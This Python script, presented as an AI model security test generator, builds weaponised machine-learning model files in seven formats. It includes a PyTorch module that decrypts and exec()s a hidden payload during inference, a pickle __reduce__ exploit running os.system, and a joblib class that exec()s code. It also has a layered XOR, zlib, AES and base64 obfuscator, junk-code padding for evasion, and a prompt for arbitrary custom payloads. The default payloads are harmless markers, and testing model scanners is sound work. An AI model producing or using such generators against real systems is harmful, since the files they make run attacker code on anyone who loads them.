import os
import pickle
import base64
import h5py
import torch
import onnx
import numpy as np
from onnx import helper, numpy_helper
import joblib
import random
import string
import zlib
import binascii
from Crypto.Cipher import AES
from datetime import datetime
import sys
import pyzipper  # Changed from zipfile to pyzipper
import shutil

# Security Configuration
KEY = os.urandom(16)
IV = os.urandom(16)
cipher = AES.new(KEY, AES.MODE_CFB, IV)
ZIP_PASSWORD = b'infected'

# Enhanced Payload Configuration
default_payloads = {
    'file_operation': '''import os
with open("security_test.txt", "w") as f:
    f.write("Xray detection test file created at {timestamp}")''',
    
    'network_test': '''import socket
try:
    socket.create_connection(("8.8.8.8", 53), timeout=2)
    with open("network_test.txt", "w") as f:
        f.write("Network simulation succeeded")
except Exception:
    pass''',
    
    'pickle_exploit': '''__import__('os').system('calc.exe')'''
}

current_payload = default_payloads['file_operation']

# PyTorch Malicious Module
class MaliciousModule(torch.nn.Module):
    def __init__(self, obf_payload, xor_key):
        super().__init__()
        self.linear = torch.nn.Linear(10, 10)
        self.payload = obf_payload
        self.xor_key = xor_key
    
    def forward(self, x):
        if torch.sum(x) > 0:
            decrypted = base64.b64decode(self.payload)
            decrypted = cipher.decrypt(decrypted)
            decrypted = zlib.decompress(decrypted)
            exec(bytes([b ^ self.xor_key for b in decrypted]))
        return self.linear(x)

# Joblib-compatible malicious class
class JoblibExploit:
    def __init__(self, code):
        self.code = code
        
    def __call__(self):
        exec(self.code)

# Advanced Obfuscation Engine
class PayloadObfuscator:
    @staticmethod
    def multi_layer_obfuscation(code):
        code = code.format(timestamp=datetime.now().isoformat())
        
        # XOR Encryption with dynamic key
        xor_key = random.randint(1, 255)
        xor_encoded = bytes([b ^ xor_key for b in code.encode()])
        
        # Compression
        compressed = zlib.compress(xor_encoded)
        
        # AES Encryption
        aes_encrypted = cipher.encrypt(compressed)
        
        # Base64 Encoding
        b64_encoded = base64.b64encode(aes_encrypted).decode()
        
        return (b64_encoded, xor_key)

# Junk Code Generator (Linux-Compatible)
class JunkGenerator:
    @staticmethod
    def random_identifier():
        return ''.join(random.choices(string.ascii_letters, k=8))
    
    @staticmethod
    def generate():
        structures = [
            lambda: f"for {JunkGenerator.random_identifier()} in range({random.randint(10,100)}): "
                     f"\n    {JunkGenerator.random_identifier()} = {random.random()}",
            lambda: f"class {JunkGenerator.random_identifier()}:" 
                     f"\n    def __init__(self):"
                     f"\n        self.{JunkGenerator.random_identifier()} = {random.randint(0,1000)}",
            lambda: f"@{JunkGenerator.random_identifier()}\n"
                     f"def {JunkGenerator.random_identifier()}():\n    return {random.choice(['None', 'True', 'False'])}",
            lambda: f"import subprocess\n"
                     f"try:\n    subprocess.check_output(['ls', '/tmp'], stderr=subprocess.DEVNULL)\n"
                     f"except Exception as e:\n    pass"
        ]
        return '\n'.join([random.choice(structures)() for _ in range(5)])

# Model Generators
class ModelGenerator:
    @staticmethod
    def tensorflow_pb():
        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        proto = f'''
        node {{
            name: "secure_layer"
            op: "Const"
            attr {{
                key: "encrypted_weights"
                value {{
                    tensor {{
                        dtype: DT_STRING
                        tensor_shape {{}}
                        string_val: "{obf_payload}|{xor_key}"
                    }}
                }}
            }}
        }}
        {JunkGenerator.generate()}
        '''
        with open("malicious_graph.pb", "w") as f:
            f.write(proto)

    @staticmethod
    def keras_h5():
        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        with h5py.File("suspicious_model.h5", "w") as f:
            raw_data = obf_payload.encode()
            dt = h5py.special_dtype(vlen=bytes)
            f.create_dataset("model_weights", 
                            data=np.array([raw_data], dtype=object), 
                            dtype=dt)
            grp = f.create_group("config")
            grp.attrs["metadata"] = JunkGenerator.generate()
            grp.attrs["xor_key"] = xor_key

    @staticmethod
    def pytorch_checkpoint():
        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        model = torch.nn.Sequential(
            torch.nn.Linear(10, 256),
            MaliciousModule(obf_payload, xor_key),
            torch.nn.ReLU()
        )
        torch.save(model.state_dict(), "malicious_checkpoint.pt")
        torch.save(model, "malicious_model.pth")

    @staticmethod
    def onnx_model():
        obf_payload, xor_key = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        node = helper.make_node(
            'Constant',
            inputs=[],
            outputs=['output'],
            value=helper.make_tensor(
                name='encrypted_payload',
                data_type=onnx.TensorProto.STRING,
                dims=[],
                vals=[obf_payload.encode()]
            )
        )
        graph = helper.make_graph(
            [node],
            'malicious_graph',
            [helper.make_tensor_value_info('input', onnx.TensorProto.FLOAT, [1])],
            [helper.make_tensor_value_info('output', onnx.TensorProto.STRING, [1])]
        )
        model = helper.make_model(graph, producer_name='ctat-test')
        onnx.save(model, "malicious_model.onnx")

    @staticmethod
    def sklearn_joblib():
        malicious_code = default_payloads['pickle_exploit']
        model = {'malicious': JoblibExploit(malicious_code)}
        
        class Exploit:
            def __reduce__(self):
                return (os.system, (malicious_code.split('(')[1].split(')')[0],))
        
        joblib.dump(model, "malicious_model.joblib")
        with open("malicious_model.pkl", "wb") as f:
            pickle.dump(Exploit(), f)

    @staticmethod
    def saved_model():
        os.makedirs("malicious_saved_model/variables", exist_ok=True)
        os.makedirs("malicious_saved_model/assets", exist_ok=True)
        with open("malicious_saved_model/assets/payload.txt", "w") as f:
            f.write(current_payload)
        with open("malicious_saved_model/variables/variables.data-00000-of-00001", "wb") as f:
            f.write(os.urandom(1024))
        obf_payload, _ = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        with open("malicious_saved_model/saved_model.pb", "w") as f:
            f.write(f'malicious_content: "{obf_payload}"\n{JunkGenerator.generate()}')

    @staticmethod
    def encrypted_zip():
        ModelGenerator.tensorflow_pb()
        with pyzipper.AESZipFile(
            'encrypted_model.zip',
            'w',
            compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES
        ) as zf:
            zf.setpassword(ZIP_PASSWORD)
            zf.write('malicious_graph.pb')
        
        # Save password to file
        with open("zip_password.txt", "w") as f:
            f.write(f"ZIP Password: {ZIP_PASSWORD.decode()}")
        
        os.remove('malicious_graph.pb')
        print(f"\nZIP password saved to zip_password.txt")

# Payload Manager
class PayloadManager:
    @staticmethod
    def set_custom_payload():
        print("\nEnter custom payload (press Enter twice to finish):")
        lines = []
        while True:
            line = input()
            if line == "":
                if len(lines) > 0:
                    break
                else:
                    continue
            lines.append(line)
        global current_payload
        current_payload = '\n'.join(lines)
        print("\nCustom payload set successfully!")

    @staticmethod
    def show_menu():
        global current_payload
        while True:
            print(f'''
=== AI Model Security Test Generator ===
Current Payload Type: {current_payload[:50]}...

1. Generate TensorFlow .pb File
2. Generate Keras .h5 File
3. Generate PyTorch .pt/.pth
4. Generate ONNX Model
5. Generate scikit-learn .joblib/.pkl
6. Generate SavedModel Directory
7. Generate Encrypted ZIP
8. Set Custom Payload
9. Reset to Default Payload
10. Generate All Test Cases
11. Exit
            ''')
            choice = input("Select option: ").strip()
            generators = {
                '1': ModelGenerator.tensorflow_pb,
                '2': ModelGenerator.keras_h5,
                '3': ModelGenerator.pytorch_checkpoint,
                '4': ModelGenerator.onnx_model,
                '5': ModelGenerator.sklearn_joblib,
                '6': ModelGenerator.saved_model,
                '7': ModelGenerator.encrypted_zip
            }
            if choice in generators:
                generators[choice]()
                print(f"\nTest case {choice} generated!")
            elif choice == '8':
                PayloadManager.set_custom_payload()
            elif choice == '9':
                current_payload = default_payloads['file_operation']
                print("\nReset to default payload")
            elif choice == '10':
                for gen in generators.values():
                    gen()
                print("\nAll test cases generated!")
            elif choice == '11':
                sys.exit(0)
            else:
                print("Invalid option")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    if not os.path.exists("models"):
        os.makedirs("models")
    os.chdir("models")
    random.seed(int.from_bytes(os.urandom(4), byteorder="big"))
    PayloadManager.show_menu()